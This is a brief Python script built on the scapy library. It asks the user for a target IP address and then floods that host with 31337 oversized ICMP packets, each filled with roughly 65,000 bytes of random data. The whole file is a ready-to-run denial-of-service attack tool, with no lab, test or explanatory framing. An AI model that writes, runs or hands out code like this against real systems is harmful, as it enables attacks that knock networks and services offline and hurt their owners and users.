import sys
from scapy.all import *

targetIP = raw_input("Target IP Address: ")
#targetPort = raw_input("Target Port: ")

send(IP(dst=targetIP)/ICMP()/Raw(RandString(size=65335)), count=31337)
